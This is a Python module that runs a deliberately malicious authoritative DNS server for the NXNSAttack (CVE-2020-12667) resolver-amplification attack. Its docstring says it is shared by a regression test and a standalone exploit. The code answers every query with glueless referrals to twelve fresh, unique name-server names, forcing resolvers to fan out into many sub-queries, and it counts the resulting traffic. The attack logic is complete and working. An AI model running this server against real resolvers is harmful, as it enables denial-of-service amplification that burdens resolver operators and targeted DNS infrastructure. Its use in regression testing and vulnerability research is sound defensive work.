"""Malicious authoritative server for NXNSAttack (CVE-2020-12667) tests.

Answers EVERY query with a glueless delegation to fresh, globally-unique NS
names, so one client query fans out across a tree of resolver sub-resolutions
with nothing short-circuiting via cache or glue. Counts every query it sees.

Shared by the regression test (test_nxns_amplification.py) and the standalone
exploit (../exploit/nxns_amplify.py) — the only differences between their needs
are the bind port and whether they read the per-depth histogram, both of which
this module exposes.

Zone labels encode the tree path: 'n' is the root zone, 'n-0'/'n-1' its
children, 'n-0-3' a grandchild, etc. Depth = number of path segments.
"""

from __future__ import annotations

import socket
import threading
from collections import Counter

import dns.flags
import dns.message
import dns.name
import dns.rcode
import dns.rrset

ROOT_LABEL = "n"
FANOUT = 12           # NS names per glueless referral (the resolver fetches at most 3)
SERVER_MAX_DEPTH = 5  # stop delegating past here; the resolver's own depth cap bites first


def child_label(path: list[int]) -> str:
    return ROOT_LABEL + "".join(f"-{i}" for i in path)


def decode(label: str) -> list[int] | None:
    """Decode a zone label like 'n-0-3' -> [0, 3]; None if not ours."""
    if label == ROOT_LABEL:
        return []
    if not label.startswith(ROOT_LABEL + "-"):
        return None
    try:
        return [int(x) for x in label[len(ROOT_LABEL) + 1 :].split("-") if x]
    except ValueError:
        return None


class EvilRoot:
    """Authoritative for the whole tree. Hands back glueless delegations.

    Usable either as a context manager (`with EvilRoot(ip, port) as evil:`) or
    via explicit `start()`/`stop()`. `total` is the query count; `by_depth` is
    the per-delegation-depth histogram.
    """

    def __init__(self, ip: str, port: int) -> None:
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((ip, port))
        self.sock.settimeout(0.3)
        self._stop = threading.Event()
        self._lock = threading.Lock()
        self.total = 0
        self.by_depth: Counter[int] = Counter()
        self.thread = threading.Thread(target=self._serve, daemon=True)

    def start(self) -> "EvilRoot":
        self.thread.start()
        return self

    def stop(self) -> None:
        self._stop.set()
        self.thread.join(timeout=2.0)
        self.sock.close()

    def __enter__(self) -> "EvilRoot":
        return self.start()

    def __exit__(self, *_exc) -> None:
        self.stop()

    def _serve(self) -> None:
        while not self._stop.is_set():
            try:
                data, src = self.sock.recvfrom(65535)
            except (socket.timeout, OSError):
                if self._stop.is_set():
                    break
                continue
            try:
                resp = self._respond(dns.message.from_wire(data))
            except Exception:
                continue
            if resp is not None:
                try:
                    self.sock.sendto(resp.to_wire(), src)
                except OSError:
                    pass

    def _respond(self, query: dns.message.Message) -> dns.message.Message | None:
        if not query.question:
            return None
        labels = [b.decode("ascii", "replace") for b in query.question[0].name.labels if b]
        if not labels:  # root priming: empty NOERROR, the resolver falls back to hints
            return self._nodata(query, authority=False)
        path = decode(labels[-1])
        if path is None:
            return self._nodata(query)
        with self._lock:
            self.total += 1
            self.by_depth[len(path)] += 1
        if len(path) >= SERVER_MAX_DEPTH:
            return self._nodata(query)
        return self._referral(query, labels[-1], path)

    def _referral(self, query, zone_label, path):
        resp = dns.message.make_response(query)
        resp.flags &= ~dns.flags.AA  # referral, not an authoritative answer
        resp.set_rcode(dns.rcode.NOERROR)
        owner = dns.name.from_text(zone_label + ".")
        # Each NS name lives under its own unique child zone, so resolving it
        # forces a fresh delegation walk — no cache overlap, no NS loop.
        targets = [f"ns.{child_label(path + [i])}." for i in range(FANOUT)]
        resp.authority.append(dns.rrset.from_text_list(owner, 86400, "IN", "NS", targets))
        # ADDITIONAL deliberately empty => glueless => the resolver must chase each NS.
        return resp

    def _nodata(self, query, authority=True):
        resp = dns.message.make_response(query)
        resp.set_rcode(dns.rcode.NOERROR)
        resp.flags |= dns.flags.AA
        if authority and query.question:
            resp.authority.append(dns.rrset.from_text(
                query.question[0].name, 300, "IN", "SOA",
                "ns.invalid. hostmaster.invalid. 1 7200 3600 86400 300",
            ))
        return resp
